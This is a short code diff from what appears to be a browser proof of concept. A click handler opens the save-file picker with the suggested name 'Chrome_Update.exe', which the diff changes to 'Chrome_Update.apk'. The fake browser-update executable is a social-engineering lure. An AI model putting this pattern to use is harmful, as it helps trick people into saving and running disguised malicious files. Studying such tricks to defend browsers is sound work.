@@ -12,10 +12,10 @@ document.getElementById('trigger').onclick = async () => {
 
   // Step 2: Open privileged picker
   fileHandle = await showSaveFilePicker({
-    suggestedName: 'Chrome_Update.exe',
+    suggestedName: 'Chrome_Update.apk',
     types: [{
       description: 'Executable',
-      accept: { 'application/octet-stream': ['.exe'] }
+      accept: { 'application/octet-stream': ['.apk'] }
     }]
   });
 
